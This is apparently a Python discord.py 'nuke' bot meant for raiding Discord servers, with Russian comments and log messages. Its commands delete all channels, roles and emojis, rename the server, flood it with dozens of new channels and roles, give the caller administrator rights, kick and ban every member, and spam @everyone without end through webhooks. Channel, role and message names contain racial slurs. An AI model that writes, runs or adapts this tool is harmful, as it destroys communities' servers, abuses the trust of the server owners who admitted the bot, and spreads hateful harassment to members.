import discord
import time
import random
import asyncio
import os
import json
import inspect
import aiohttp
import datetime
import threading
from discord import Permissions
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
from discord import client
from discord.ext import commands
from discord.utils import get
from threading import Thread
from time import sleep
import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from colorama import Fore, init




intents = discord.Intents.all()
client = discord.client
bot = commands.Bot(command_prefix = 'l.', intents=intents)
bot.remove_command( 'help' )






@bot.command()
async def auto(ctx):
  for x in ctx.guild.channels:
    try: await x.delete()
    except: pass
    guild = ctx.message.guild
    await guild.edit(name='Crash by NiggerArmy')
  for x in ctx.guild.roles:
    try: await x.delete()
    except: pass
  for x in ctx.guild.emojis:
    try: await x.delete()
    except: pass
  for x in range(100):
    await ctx.guild.create_text_channel(name=" NiggerArmy")
  for x in range(100):
    await ctx.guild.create_role(name ="crash by  NiggerArmy")



@bot.command()
async def nuke(ctx):
  for x in ctx.guild.channels:
    try: await x.delete()
    except: pass
  for x in ctx.guild.roles:
    try: await x.delete()
    except: pass
  for x in ctx.guild.emojis:
    try: await x.delete()
    except: pass

@bot.command() 
async def admin(ctx):  
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name=" Nigger", permissions=perms) 
    
    role = discord.utils.get(ctx.guild.roles, name=" Nigger") 
    user = ctx.message.author 
    await user.add_roles(role) 

    await ctx.message.delete()



@bot.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {bot.user}')
  await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'l.help', url='ur twitch'))



@bot.command()
async def kickall(ctx):
    for m in ctx.guild.members:
        try:
            await m.kick(reason="white")
        except:
            pass


@bot.command()
async def banall(ctx):
    for m in ctx.guild.members:
        try:
            await m.ban(reason="white")
        except:
            pass

@bot.command()
async def delemoji(ctx):
	for emoji in ctx.guild.emojis:
	 await emoji.delete()


@bot.command()
async def channels(ctx):
    await ctx.message.delete()
    for i in range(1,100):
        await ctx.guild.create_text_channel('crashed by  NiggerArmy')
    for i in range(1,100):
        await ctx.guild.create_voice_channel('Crashed By  NiggerArmy')

@bot.command()
async def roles(ctx):
    for i in range(0,100):
        await ctx.guild.create_role(name = ' NiggerArmy')

@bot.command()
async def delchannels(ctx):
    await ctx.message.delete()
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="По просьбе") #удаляем
        except: failed.append(channel.name)
        else: counter += 1


@bot.command()
async def delroles(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass

@bot.command()
async def spamall(ctx):
  for a in range(200):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send("@everyone краш")
        except:
            continue


@bot.command()
async def spamall1(ctx):
   await crhooks(ctx)
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))
   asyncio.create_task(spamhook(ctx))


async def crhooks(ctx):
  print(f"{Fore.WHITE}> {Fore.RED}Спамим хуками{Fore.WHITE}.")
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='ВЫ ЛОХИ')
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал хук в {channel}")
    except:
      print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не создал хук в {channel}")
      continue
  print(f"{Fore.WHITE}> {Fore.RED}Заспамили хуками{Fore.WHITE}.")


async def spamhook(ctx):
  while True:
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='@everyone @here nill kiggers', wait=True)
      except:
        continue
	
bot.run("")
